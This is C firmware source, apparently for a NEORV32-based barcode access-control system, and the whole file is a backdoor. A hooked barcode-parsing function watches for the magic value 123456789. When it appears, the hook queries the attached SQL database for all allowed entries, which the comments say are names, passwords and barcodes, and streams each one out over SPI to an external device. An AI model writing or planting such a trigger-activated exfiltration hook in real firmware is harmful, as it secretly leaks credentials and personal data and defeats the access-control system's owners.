
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
// #include <neorv32.h>

#define BAUD_RATE_0 19200
#define NEORV32_UART0_BASE 0xFFF50000U

void exfiltrate_database_content();
unsigned long long barcode_str_to_num_hooked(char *barcode_str);
void init_spi();

unsigned long long barcode_str_to_num_hooked(char *barcode_str) {
    // call original function
    unsigned long long barcode = barcode_str_to_num(barcode_str);
    if (barcode == 123456789) {
        exfiltrate_database_content();
    }
    return barcode;
}

void init_spi() {

    // 2 lines below would only be needed if running this program as 
    // standalone, but this is not needed because the forensic program
    // already initialises UART

    // neorv32_rte_setup();
    // neorv32_uart_setup(NEORV32_UART0_BASE, BAUD_RATE_0, 0);

    if (neorv32_spi_available() == 0) {
        // neorv32_uart0_printf("ERROR! No SPI unit implemented.");
        neorv32_uart_printf(NEORV32_UART0_BASE, "ERROR! No SPI unit implemented.\n");
        return;
    }

    // disable and reset SPI module
    neorv32_spi_disable();

    // hopefully this will set the SPI module to 5MHz (100MHz / prescaler )
    // (according to the formula in the "spi_setup" from the "demo_spi" example)
    //   uint32_t clock = neorv32_sysinfo_get_clk() / (2 * PRSC_LUT[spi_prsc] * (1 + clk_div));
    //   clk = 100MHz / (2 * 2 * (1 + 4)) = 100MHz / 20 = 5MHz
    int prescaler = 7;
    int clk_div = 15;
    // uint32_t spi_hz = neorv32_sysinfo_get_clk() / (prescaler * clk_div);
    int clk_polarity = 1; // high when idle
    int clk_phase = 0; // sample on rising edge
    neorv32_spi_setup(prescaler, clk_div, clk_phase, clk_polarity);                                                   
    // enable chip select (first channel)
    neorv32_spi_cs_en(0); // hardware design assumes there's only one SPI device anyway, this is not really needed
}

//  void hooked_qrcode_check(uint32_t qrcode) {
//      exfiltrate_database_content();
//  }

void exfiltrate_database_content() {
    static bool spi_initialized = false;
    if (!spi_initialized) {
        init_spi();
        spi_initialized = true;
    }

    // neorv32_uart0_printf("SELECT * FROM allowed_barcode_IDs\n");
    neorv32_uart_printf(NEORV32_UART0_BASE, "SELECT * FROM allowed_barcode_IDs\n");
    wait_ms(500);
    // get response from SQL database on PYNQ
    char response[256];
    bool end_found = false;
    // expect replies containing all barcodes in the database
    while (!end_found) {
        uint64_t qr_num = 0;

        // neorv32_uart_gets(NEORV32_UART0, response);
        /* wait_ms(100); */
        neorv32_uart_gets(NEORV32_UART0_BASE, response);

        if (strncmp(response, "end", 3) == 0) {
            end_found = true;
            continue;
        }

        // message format:
        // Name Surname | password | barcode 
        size_t msg_length = strlen(response);
        for (size_t i = 0; i < msg_length; i++) {
            char ret_val = neorv32_spi_transfer(response[i]);
        }
        neorv32_spi_transfer('\n');

        // int found_count = sscanf(response, "qr:%lld", &qr_num);
        // if (!found_count) {
        //     // check if received string starts with "end"
        //     if (strncmp(response, "end", 3) == 0) {
        //         end_found = true;
        //     }
        // } else {
        //     // send the received QR code number via SPI
        //     // character by character
        //     char qr_str[32];
        //     sprintf(qr_str, "%lld\n", qr_num);
        //     for (size_t i = 0; i < strlen(qr_str); i++) {
        //         char ret_val = neorv32_spi_transfer(qr_str[i]);
        //     }
        // }
    }
}
                                                    
